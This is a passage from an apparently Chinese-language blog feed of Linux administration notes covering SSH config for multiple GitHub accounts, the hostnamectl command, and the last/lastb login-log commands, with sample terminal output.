title="文件位置"></a>文件位置</h4><p>~&#x2F;.ssh&#x2F;config</p><h4 id="配置文件添加内容"><a href="#配置文件添加内容" class="headerlink" title="配置文件添加内容"></a>配置文件添加内容</h4><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">Host moss119github.com<br>  HostName github.com<br>  <span class="hljs-keyword">User</span> <span class="hljs-title">git</span><br>  IdentityFile ~/.ssh/id_rsa_moss119<br>  PreferredAuthentications publickey<br></code></pre></td></tr></table></figure><p>Host：HostName 的别名</p><p>HostName：GitHub 的主机名为 “github.com”</p><p>User：设置为 “git”，是 GitHub 上 SSH 连接的默认用户名</p><p>IdentityFile： 指定 GitHub 身份验证密钥文件的路径。如果 GitHub 密钥不是默认的 <code>~/.ssh/id_rsa</code>，则需要指定正确的路径。例如，密钥文件名为 <code>id_rsa_moss119</code>，则将其路径设置为 <code>~/.ssh/id_rsa_moss119</code>。</p><h3 id="验证SSH登录"><a href="#验证SSH登录" class="headerlink" title="验证SSH登录"></a>验证SSH登录</h3><p>ssh -T 别名</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stylus">➜  moss119<span class="hljs-selector-class">.github</span><span class="hljs-selector-class">.io</span> git:(main) ssh -T moss119github<span class="hljs-selector-class">.com</span><br>Hi moss119! You<span class="hljs-string">&#x27;ve successfully authenticated, but GitHub does not provide shell access.</span><br></code></pre></td></tr></table></figure><h2 id="错误解决"><a href="#错误解决" class="headerlink" title="错误解决"></a>错误解决</h2><h3 id="Permission-denied"><a href="#Permission-denied" class="headerlink" title="Permission denied"></a>Permission denied</h3><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stylus">➜  moss119<span class="hljs-selector-class">.github</span><span class="hljs-selector-class">.io</span> git:(main) ssh -T moss119github<span class="hljs-selector-class">.com</span>     <br>admin@github<span class="hljs-selector-class">.com</span>: Permission denied (publickey).<br></code></pre></td></tr></table></figure><p>ssh config 没有设置用户名且命令中没有指定用户，会使用当前设备登录的用户名进行登录验证，肯定会报错</p><p>解决方案</p><p>ssh config 中设置用户：User git</p><p>或</p><p>命令中指定用户 ：<a href="mailto:&#103;&#105;&#116;&#64;&#109;&#x6f;&#115;&#x73;&#49;&#x31;&#x39;&#103;&#105;&#116;&#104;&#117;&#98;&#46;&#99;&#111;&#x6d;">&#103;&#105;&#116;&#64;&#109;&#x6f;&#115;&#x73;&#49;&#x31;&#x39;&#103;&#105;&#116;&#104;&#117;&#98;&#46;&#99;&#111;&#x6d;</a></p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://www.quafoo.net/posts/Add-Multi-Github-Account-On-Same-Mac/">https://www.quafoo.net/posts/Add-Multi-Github-Account-On-Same-Mac/</a></p><h1 id="SSH拉取代码"><a href="#SSH拉取代码" class="headerlink" title="SSH拉取代码"></a>SSH拉取代码</h1><ol><li><p>在本地生成 SSH key，命令为 <code>ssh-keygen -t rsa -C &quot;xxxxx@xxxxx.com&quot;</code>，这里的 <code>xxxxx@xxxxx.com</code> 是你的邮箱地址，并不要求与特定的邮箱地址匹配。</p></li><li><p>把公钥放到 GitHub 上。在本地找到 id_rsa.pub 文件，复制里面的内容。然后回到 GitHub，进入自己的设置（Settings）页面，在 “SSH and GPG keys” 下点击 “New SSH key”，在 Key 框里粘贴刚才复制的公钥内容，然后点击 “Add key”。</p></li><li><p>测试代码是否推拉正常。在本地找个文件夹打开 Git Bash，输入 <code>git clone &lt;你的仓库SSH地址&gt;</code>，然后会瞬间拉取成功，SSH 配置就完成了。</p><p>仓库SSH地址需要注意，如果本地 ~&#x2F;.ssh&#x2F;config 文件中有配置特定的HOST，需要和配置的相同</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs stylus">Host ncgithub<span class="hljs-selector-class">.com</span><br>  HostName github<span class="hljs-selector-class">.com</span><br>  IdentityFile ~/.ssh/id_rsa_nc<br>  PreferredAuthentications publickey<br></code></pre></td></tr></table></figure><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">原始：<br>git <span class="hljs-keyword">clone</span> <span class="hljs-title">git</span>@github.com:C0isini/studynote.git<br><br>修改后：<br><br><br>git <span class="hljs-keyword">clone</span> <span class="hljs-title">git</span>@ncgithub.com:C0isini/studynote.git<br></code></pre></td></tr></table></figure></li></ol>]]></content>
    
    
    <categories>
      
      <category>yunwei</category>
      
      <category>applications</category>
      
    </categories>
    
    
    <tags>
      
      <tag>tips</tag>
      
      <tag>yunwei</tag>
      
      <tag>applications</tag>
      
      <tag>git</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>hostnamectl</title>
    <link href="/2024/03/15/yunwei/yunweicommands/Linuxcommands/hostnamectl/"/>
    <url>/2024/03/15/yunwei/yunweicommands/Linuxcommands/hostnamectl/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h1 id="hostnamectl"><a href="#hostnamectl" class="headerlink" title="hostnamectl"></a>hostnamectl</h1><p>控制系统主机名</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs scss">root<span class="hljs-keyword">@iZbp</span>1191gh7vw52537<span class="hljs-attribute">lyxrZ</span>:~# hostnamectl<br> Static <span class="hljs-attribute">hostname</span>: iZbp1191gh7vw52537lyxrZ<br>       Icon <span class="hljs-attribute">name</span>: computer-vm<br>         <span class="hljs-attribute">Chassis</span>: vm<br>      Machine <span class="hljs-attribute">ID</span>: <span class="hljs-number">8</span>da0ace235c5435eb33ae56a538def68<br>         Boot <span class="hljs-attribute">ID</span>: <span class="hljs-number">5755</span>d1b8ae8c4e7cbe47b72434abc7ea<br>  <span class="hljs-attribute">Virtualization</span>: kvm<br>Operating <span class="hljs-attribute">System</span>: Ubuntu <span class="hljs-number">22.04</span>.<span class="hljs-number">2</span> LTS<br>CPE OS <span class="hljs-attribute">Name</span>: <span class="hljs-attribute">cpe</span>: /<span class="hljs-attribute">o</span>:<span class="hljs-attribute">almalinux</span>:<span class="hljs-attribute">almalinux</span>:<span class="hljs-number">9</span>::baseos<br>          <span class="hljs-attribute">Kernel</span>: Linux <span class="hljs-number">5.15</span>.<span class="hljs-number">0</span>-<span class="hljs-number">73</span>-generic<br>    <span class="hljs-attribute">Architecture</span>: x86-<span class="hljs-number">64</span><br> Hardware <span class="hljs-attribute">Vendor</span>: Alibaba Cloud<br>  Hardware <span class="hljs-attribute">Model</span>: Alibaba Cloud ECS<br></code></pre></td></tr></table></figure><h2 id="参数解释"><a href="#参数解释" class="headerlink" title="参数解释"></a>参数解释</h2><p>Static hostname  静态主机名</p><p>Icon name 图标名</p><p>Chassis 主机类型</p><p>Machine ID 主机ID</p><p>Boot ID</p><p>Virtualization: kvm 虚拟化，可以用来标记是否是虚拟机，物理机不存在该数据</p><p>Operating System：Ubuntu 22.04.2 LTS 操作系统信息</p><p>CPE OS Name:  cpe: &#x2F;o:almalinux:almalinux:9::baseos </p><p>Kernel: Linux 5.15.0-73-generic 内核信息</p><p>Architecture: x86-64 架构信息（x86-64）</p><p>Hardware Vendor: Alibaba Cloud  硬件供应商</p><p>Hardware Model: Alibaba Cloud ECS 硬件型号</p><p>Firmware Version: xxxzz-U08 固件版本</p><h2 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h2><p>hostnamectl [OPTIONS…] {COMMAND}</p><h3 id="主机名类型"><a href="#主机名类型" class="headerlink" title="主机名类型"></a>主机名类型</h3><h4 id="pretty-主机名"><a href="#pretty-主机名" class="headerlink" title="pretty 主机名"></a>pretty 主机名</h4><p>易读的主机名称，对字符几乎没有限制（可以使用特殊字符# @ 等）</p><p>存储在 &#x2F;etc&#x2F;machine-info，从 machine-info 命令中可查看更多信息</p><p>默认设备是没有该名称的，使用 hostnamectl –pretty 查询结果为空，&#x2F;etc&#x2F;machine-info 文件也是不存在的，如果使用 hostnamectl set-hostname 设置后，文件和查询都会存在</p><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs tap">root@iZbp1191gh7vw52537lyxrZ:~<span class="hljs-comment"># ls -lat /etc/machine-info</span><br>-rw-r--r--<span class="hljs-number"> 1 </span>root root<span class="hljs-number"> 28 </span>Jan<span class="hljs-number"> 30 </span>15:20 /etc/machine-info<br></code></pre></td></tr></table></figure><h4 id="static-主机名（常说的主机名）"><a href="#static-主机名（常说的主机名）" class="headerlink" title="static 主机名（常说的主机名）"></a>static 主机名（常说的主机名）</h4><p>静态主机名称，用于启动时初始化内核主机名，对字符有限制（不可以使用特殊字符# @ 等）</p><p>存储在 &#x2F;etc&#x2F;hostname，从 hostname命令中可查看更多信息</p><h4 id="transient-主机名"><a href="#transient-主机名" class="headerlink" title="transient 主机名"></a>transient 主机名</h4><p>临时主机名称，从网络配置中接收到的临时主机名，如果静态主机名有设置，且不是localhost，就不使用临时主机名，对字符有限制（不可以使用特殊字符# @ 等）</p><p>可以使用systemd-firstboot(1)初始化挂载(但未启动)系统映像的系统主机名。</p><h3 id="选项"><a href="#选项" class="headerlink" title="选项"></a>选项</h3><h4 id="–no-ask-password"><a href="#–no-ask-password" class="headerlink" title="–no-ask-password"></a>–no-ask-password</h4><p>执行特权操作时不需要密码</p><h4 id="–static-–pretty-–transient"><a href="#–static-–pretty-–transient" class="headerlink" title="–static –pretty –transient"></a>–static –pretty –transient</h4><p>仅显示对应主机名，搭配 status 命令使用，由于 status 是 hostnamectl 默认命令，也可以不写，例如 hostnamectl –static 等价于 hostnamectl –static status</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs elixir">root<span class="hljs-variable">@iZbp1191gh7vw52537lyxrZ</span><span class="hljs-symbol">:~</span><span class="hljs-comment">#</span><br><br>root<span class="hljs-variable">@iZbp1191gh7vw52537lyxrZ</span><span class="hljs-symbol">:~</span><span class="hljs-comment"># hostnamectl --static status</span><br>iZbp1191gh7vw52537lyxrZ<br><br>root<span class="hljs-variable">@iZbp1191gh7vw52537lyxrZ</span><span class="hljs-symbol">:~</span><span class="hljs-comment"># hostnamectl --static</span><br>iZbp1191gh7vw52537lyxrZ<br></code></pre></td></tr></table></figure><p>与 set-hostname命令搭配使用，用于修改指定的主机名</p><h4 id="–version"><a href="#–version" class="headerlink" title="–version"></a>–version</h4><p>显示工具版本信息</p><figure class="highlight nsis"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs nsis">root@iZbp1191gh7vw52537lyxrZ:~<span class="hljs-comment"># hostnamectl --version</span><br><span class="hljs-params">system</span>d <span class="hljs-number">249</span> (<span class="hljs-number">249.11</span>-<span class="hljs-number">0</span>ubuntu3.<span class="hljs-number">9</span>)<br>+PAM +AUDIT +SELINUX +APPARMOR +IMA +SMACK +SECCOMP +GCRYPT +GNUTLS +OPENSSL +ACL +BLKID +CURL +ELFUTILS +FIDO2 +IDN2 -IDN +IPTC +KMOD +LIBCRYPTSETUP +LIBFDISK +PCRE2 -PWQUALITY -P11KIT -QRENCODE +<span class="hljs-literal">BZIP2</span> +LZ4 +XZ +<span class="hljs-literal">ZLIB</span> +ZSTD -XKBCOMMON +UTMP +SYSVINIT default-hierarchy=unified<br></code></pre></td></tr></table></figure><h3 id="命令"><a href="#命令" class="headerlink" title="命令"></a>命令</h3><h4 id="status"><a href="#status" class="headerlink" title="status"></a>status</h4><p>显示当前主机名和相关信息</p><h4 id="set-hostname-hostname-NAME"><a href="#set-hostname-hostname-NAME" class="headerlink" title="set-hostname&#x2F;hostname NAME"></a>set-hostname&#x2F;hostname NAME</h4><p>修改主机名，默认会修改 pretty static transient 主机名</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs elixir">root<span class="hljs-variable">@iZbp1191gh7vw52537lyxrZ</span><span class="hljs-symbol">:~</span><span class="hljs-comment"># hostnamectl --pretty</span><br><br>root<span class="hljs-variable">@iZbp1191gh7vw52537lyxrZ</span><span class="hljs-symbol">:~</span><span class="hljs-comment"># hostnamectl set-hostname aliyun#@##@</span><br>root<span class="hljs-variable">@iZbp1191gh7vw52537lyxrZ</span><span class="hljs-symbol">:~</span><span class="hljs-comment"># hostnamectl --pretty</span><br>aliyun<span class="hljs-comment">#@##@</span><br>root<span class="hljs-variable">@iZbp1191gh7vw52537lyxrZ</span><span class="hljs-symbol">:~</span><span class="hljs-comment"># cat /etc/machine-i</span><br>machine-id    machine-info<br>root<span class="hljs-variable">@iZbp1191gh7vw52537lyxrZ</span><span class="hljs-symbol">:~</span><span class="hljs-comment"># cat /etc/machine-info</span><br><span class="hljs-title class_">PRETTY_HOSTNAME</span>=aliyun<span class="hljs-comment">#@##@</span><br>root<span class="hljs-variable">@iZbp1191gh7vw52537lyxrZ</span><span class="hljs-symbol">:~</span><span class="hljs-comment"># ls -lat /etc/machine-info</span><br>-rw-r--r-- <span class="hljs-number">1</span> root root <span class="hljs-number">28</span> <span class="hljs-title class_">Jan</span> <span class="hljs-number">30</span> <span class="hljs-number">15</span><span class="hljs-symbol">:</span><span class="hljs-number">20</span> /etc/machine-info<br><br>root<span class="hljs-variable">@iZbp1191gh7vw52537lyxrZ</span><span class="hljs-symbol">:~</span><span class="hljs-comment"># hostnamectl --static</span><br>aliyun<br>root<span class="hljs-variable">@iZbp1191gh7vw52537lyxrZ</span><span class="hljs-symbol">:~</span><span class="hljs-comment"># hostnamectl --transient</span><br>aliyun<br><br><br></code></pre></td></tr></table></figure><p>可以指定只修改某个主机名 hostnamectl –static set-hostname iZbp1191gh7vw52537lyxrZ</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs elixir">root<span class="hljs-variable">@iZbp1191gh7vw52537lyxrZ</span><span class="hljs-symbol">:~</span><span class="hljs-comment"># hostnamectl --static set-hostname iZbp1191gh7vw52537lyxrZ</span><br>root<span class="hljs-variable">@iZbp1191gh7vw52537lyxrZ</span><span class="hljs-symbol">:~</span><span class="hljs-comment"># hostnamectl --pretty</span><br>aliyun<span class="hljs-comment">#@##@</span><br>root<span class="hljs-variable">@iZbp1191gh7vw52537lyxrZ</span><span class="hljs-symbol">:~</span><span class="hljs-comment"># hostnamectl --static</span><br>iZbp1191gh7vw52537lyxrZ<br>root<span class="hljs-variable">@iZbp1191gh7vw52537lyxrZ</span><span class="hljs-symbol">:~</span><span class="hljs-comment"># hostnamectl --transient</span><br>iZbp1191gh7vw52537lyxrZ<br></code></pre></td></tr></table></figure><h4 id="set-icon-name-icon-name-NAME"><a href="#set-icon-name-icon-name-NAME" class="headerlink" title="set-icon-name&#x2F;icon-name NAME"></a>set-icon-name&#x2F;icon-name NAME</h4><p>设置主机图标名称，图标名称用于一些图形化程序可视化当前主机</p><p>NAME 为空’’的时候，会重置为默认值</p><p>一般都是 computer-vm</p><h4 id="set-chassis-chassis-TYPE"><a href="#set-chassis-chassis-TYPE" class="headerlink" title="set-chassis&#x2F;chassis TYPE"></a>set-chassis&#x2F;chassis TYPE</h4><p>设置主机类型，主机类型用于一些图形化程序可视化主机或者修改用户交互</p><p>TYPE  为空’’的时候，会重置为默认值</p><p>TYPE可选参数：</p><p>desktop</p><p>laptop（笔记本）</p><p>server</p><p>tablet（平板电脑）</p><p>handset（手机）</p><p>watch</p><p>embedded</p><p>vm</p><p>container</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs scss">root<span class="hljs-keyword">@iZbp</span>1191gh7vw52537<span class="hljs-attribute">lyxrZ</span>:~# hostnamectl set-chassis watch<br>root<span class="hljs-keyword">@iZbp</span>1191gh7vw52537<span class="hljs-attribute">lyxrZ</span>:~# hostnamectl<br> Static <span class="hljs-attribute">hostname</span>: iZbp1191gh7vw52537lyxrZ<br> Pretty <span class="hljs-attribute">hostname</span>: aliyun#@##@<br>       Icon <span class="hljs-attribute">name</span>: computer-watch<br>         <span class="hljs-attribute">Chassis</span>: watch<br>      Machine <span class="hljs-attribute">ID</span>: <span class="hljs-number">8</span>da0ace235c5435eb33ae56a538def68<br>         Boot <span class="hljs-attribute">ID</span>: <span class="hljs-number">5755</span>d1b8ae8c4e7cbe47b72434abc7ea<br>  <span class="hljs-attribute">Virtualization</span>: kvm<br>Operating <span class="hljs-attribute">System</span>: Ubuntu <span class="hljs-number">22.04</span>.<span class="hljs-number">2</span> LTS<br>          <span class="hljs-attribute">Kernel</span>: Linux <span class="hljs-number">5.15</span>.<span class="hljs-number">0</span>-<span class="hljs-number">73</span>-generic<br>    <span class="hljs-attribute">Architecture</span>: x86-<span class="hljs-number">64</span><br> Hardware <span class="hljs-attribute">Vendor</span>: Alibaba Cloud<br>  Hardware <span class="hljs-attribute">Model</span>: Alibaba Cloud ECS<br><br>root<span class="hljs-keyword">@iZbp</span>1191gh7vw52537<span class="hljs-attribute">lyxrZ</span>:~# hostnamectl set-chassis <span class="hljs-string">&#x27;&#x27;</span><br>root<span class="hljs-keyword">@iZbp</span>1191gh7vw52537<span class="hljs-attribute">lyxrZ</span>:~# hostnamectl<br> Static <span class="hljs-attribute">hostname</span>: iZbp1191gh7vw52537lyxrZ<br> Pretty <span class="hljs-attribute">hostname</span>: aliyun#@##@<br>       Icon <span class="hljs-attribute">name</span>: computer-vm<br>         <span class="hljs-attribute">Chassis</span>: vm<br>      Machine <span class="hljs-attribute">ID</span>: <span class="hljs-number">8</span>da0ace235c5435eb33ae56a538def68<br>         Boot <span class="hljs-attribute">ID</span>: <span class="hljs-number">5755</span>d1b8ae8c4e7cbe47b72434abc7ea<br>  <span class="hljs-attribute">Virtualization</span>: kvm<br>Operating <span class="hljs-attribute">System</span>: Ubuntu <span class="hljs-number">22.04</span>.<span class="hljs-number">2</span> LTS<br>          <span class="hljs-attribute">Kernel</span>: Linux <span class="hljs-number">5.15</span>.<span class="hljs-number">0</span>-<span class="hljs-number">73</span>-generic<br>    <span class="hljs-attribute">Architecture</span>: x86-<span class="hljs-number">64</span><br> Hardware <span class="hljs-attribute">Vendor</span>: Alibaba Cloud<br>  Hardware <span class="hljs-attribute">Model</span>: Alibaba Cloud ECS<br></code></pre></td></tr></table></figure><h4 id="set-deployment-deployment-ENVIRONMENT"><a href="#set-deployment-deployment-ENVIRONMENT" class="headerlink" title="set-deployment&#x2F;deployment ENVIRONMENT"></a>set-deployment&#x2F;deployment ENVIRONMENT</h4><p>设置环境描述</p><p>ENVIRONMENT 不可以包含控制字符</p><p>ENVIRONMENT 建议的值：</p><p>development</p><p>integration</p><p>staging</p><p>production</p><p>ENVIRONMENT  为空’’的时候，会重置为默认值</p><h4 id="set-location-location-LOCATION"><a href="#set-location-location-LOCATION" class="headerlink" title="set-location&#x2F;location LOCATION"></a>set-location&#x2F;location LOCATION</h4><p>设置设备所处位置</p><p>LOCATION 为空’’的时候，会重置为默认值</p>]]></content>
    
    
    <categories>
      
      <category>yunwei</category>
      
      <category>commands</category>
      
    </categories>
    
    
    <tags>
      
      <tag>yunwei</tag>
      
      <tag>commands</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>last-lastb</title>
    <link href="/2024/03/15/yunwei/yunweicommands/Linuxcommands/last&amp;lastb/"/>
    <url>/2024/03/15/yunwei/yunweicommands/Linuxcommands/last&amp;lastb/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h1 id="last"><a href="#last" class="headerlink" title="last"></a>last</h1><p>last命令会读取用户登录日志内容展示出来，默认&#x2F;var&#x2F;log&#x2F;wtmp，也可以通过 -f 来指定文件</p><h2 id="参数描述"><a href="#参数描述" class="headerlink" title="参数描述"></a>参数描述</h2><h3 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h3><p>last [-R] [-num] [ -n num ] [-adFiowx] [ -f file ] [ -t YYYYMMDDHHMMSS ] [name…]  [tty…]</p><p>-f file:指定读取的文件，默认为&#x2F;var&#x2F;log&#x2F;wtmp</p><p>-num</p><p>-n num :显示多少行的数据</p><p>-R:禁止显示主机名</p><p>-a:最后一列显示源主机名</p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs autoit">(base) [root<span class="hljs-symbol">@110</span> <span class="hljs-built_in">log</span>]<span class="hljs-meta"># last -n 10 -a</span><br>root     pts/<span class="hljs-number">1</span>        Tue Nov <span class="hljs-number">16</span> <span class="hljs-number">20</span>:<span class="hljs-number">23</span>   still logged <span class="hljs-keyword">in</span>    <span class="hljs-number">1.1</span><span class="hljs-number">.1</span><span class="hljs-number">.1</span><br></code></pre></td></tr></table></figure><p>-d:最后一列替换为源主机IP</p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs autoit">(base) [root<span class="hljs-symbol">@110</span> <span class="hljs-built_in">log</span>]<span class="hljs-meta"># last -n 10 -a -d</span><br>root     pts/<span class="hljs-number">1</span>        Tue Nov <span class="hljs-number">16</span> <span class="hljs-number">20</span>:<span class="hljs-number">23</span>   still logged <span class="hljs-keyword">in</span>    <span class="hljs-number">1.1</span><span class="hljs-number">.1</span><span class="hljs-number">.1</span><br></code></pre></td></tr></table></figure><p>-F:登录时间，推出时间完整展示</p><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs tap">(base) [root@110 log]<span class="hljs-comment"># last -n 10 -a -d -F</span><br>root     pts/1        Tue Nov<span class="hljs-number"> 16 </span>20:23:07<span class="hljs-number"> 2021 </span>  still logged in                       1.1.1.1<br>root     pts/0        Tue Nov<span class="hljs-number"> 16 </span>09:35:43<span class="hljs-number"> 2021 </span>  still logged in                       1.1.1.1<br>root     pts/0        Mon Nov<span class="hljs-number"> 15 </span>16:16:36<span class="hljs-number"> 2021 </span>- Mon Nov<span class="hljs-number"> 15 </span>19:30:01<span class="hljs-number"> 2021 </span> (03:13)     1.1.1.1<br>reboot   system boot  Tue Nov<span class="hljs-number"> 16 </span>00:14:47<span class="hljs-number"> 2021 </span>- Tue Nov<span class="hljs-number"> 16 </span>20:50:34<span class="hljs-number"> 2021 </span> (20:35)     0.0.0.0<br>root     pts/1        Mon Nov<span class="hljs-number"> 15 </span>15:38:35<span class="hljs-number"> 2021 </span>- down                      (00:36)     1.1.1.1<br>root     pts/0        Mon Nov<span class="hljs-number"> 15 </span>15:08:20<span class="hljs-number"> 2021 </span>- down                      (01:06)     1.1.1.1<br>root     pts/1        Thu Nov<span class="hljs-number"> 11 </span>20:55:21<span class="hljs-number"> 2021 </span>- Thu Nov<span class="hljs-number"> 11 </span>23:11:33<span class="hljs-number"> 2021 </span> (02:16)     1.1.1.1<br></code></pre></td></tr></table></figure><p>命令读取的文件：</p><p>&#x2F;var&#x2F;log&#x2F;wtmp</p><p>该文件为二进制文件，无法直接用cat查看</p><h2 id="lastb"><a href="#lastb" class="headerlink" title="lastb"></a>lastb</h2><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>lastb命令和last命令类似，默认&#x2F;var&#x2F;log&#x2F;btmp，会显示所有登录记录（成功+失败）</p><h3 id="语法-1"><a href="#语法-1" class="headerlink" title="语法"></a>语法</h3><p>lastb [-R] [-num] [ -n num ] [ -f file ] [-adFiowx] [name…]  [tty…]</p><h4 id="lastb-1"><a href="#lastb-1" class="headerlink" title="lastb"></a>lastb</h4><p>显示登录失败的用户信息</p><figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs subunit">[root@iZbp1191gh7vw52537lyxrZ log]# lastb | more<br>         ssh:notty    175.24.152.224   Thu Aug 25 04:36 - 04:36  (00:00)<br>git      ssh:notty    60.171.76.133    Thu Aug 25 02:59 - 02:59  (00:00)<br>git      ssh:notty    60.171.76.133    Thu Aug 25 02:59 - 02:59  (00:00)<br>psxtg    ssh:notty    192.46.210.172   Wed Aug 24 19:23 - 19:23  (00:00)<br>scdva    ssh:notty    195.96.137.7     Wed Aug 24 17:40 - 17:40  (00:00)<br>         ssh:notty    110.42.200.114   Wed Aug 24 15:14 - 15:14  (00:00)<br>         ssh:notty    175.24.152.224   Wed Aug 24 11:30 - 11:30  (00:00)<br>         ssh:notty    110.42.200.114   Tue Aug 23 18:12 - 18:12  (00:00)<br>root     ssh:notty    201.213.185.243  Tue Aug 23 04:32 - 04:32  (00:00)<br>         ssh:notty    42.194.144.103   Tue Aug 23 00:07 - 00:07  (00:00)<br>username ssh:notty    183.136.225.14   Mon Aug 22 22:53 - 22:53  (00:00)<br>         ssh:notty    65.49.20.68      Mon Aug 22 15:54 - 15:54  (00:00)<br>         ssh:notty    110.42.200.114   Mon Aug 22 13:18 - 13:18  (00:00)<br>test1    pts/2        Thu Aug 18 23:53 - 23:53  (00:00)<br>         ssh:notty    Thu Aug 18 23:38 - 23:38  (00:00)<br><span class="hljs-keyword">test     </span>pts/3        Thu Aug 18 23:24 - 23:24  (00:00)<br><span class="hljs-keyword">test     </span>pts/1        Thu Aug 18 23:11 - 23:11  (00:00)<br>...<br>btmp begins Mon Aug  1 18:23:34 2022<br></code></pre></td></tr></table></figure><h4 id="lastb-d-将IP转换为主机名显示"><a href="#lastb-d-将IP转换为主机名显示" class="headerlink" title="lastb -d 将IP转换为主机名显示"></a>lastb -d 将IP转换为主机名显示</h4><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs less"><span class="hljs-selector-attr">[root@iZbp1191gh7vw52537lyxrZ log]</span>#  <span class="hljs-selector-tag">lastb</span> <span class="hljs-selector-tag">-d</span><br>         <span class="hljs-selector-tag">ssh</span><span class="hljs-selector-pseudo">:not</span><span class="hljs-selector-tag">ty</span>    <span class="hljs-number">175.24</span><span class="hljs-selector-class">.152</span><span class="hljs-selector-class">.224</span>   <span class="hljs-selector-tag">Thu</span> <span class="hljs-selector-tag">Aug</span> <span class="hljs-number">25</span> <span class="hljs-number">04</span>:<span class="hljs-number">36</span> <span class="hljs-selector-tag">-</span> <span class="hljs-number">04</span>:<span class="hljs-number">36</span>  (<span class="hljs-number">00</span>:<span class="hljs-number">00</span>)<br><span class="hljs-selector-tag">git</span>      <span class="hljs-selector-tag">ssh</span><span class="hljs-selector-pseudo">:not</span><span class="hljs-selector-tag">ty</span>    <span class="hljs-number">60.171</span><span class="hljs-selector-class">.76</span><span class="hljs-selector-class">.133</span>    <span class="hljs-selector-tag">Thu</span> <span class="hljs-selector-tag">Aug</span> <span class="hljs-number">25</span> <span class="hljs-number">02</span>:<span 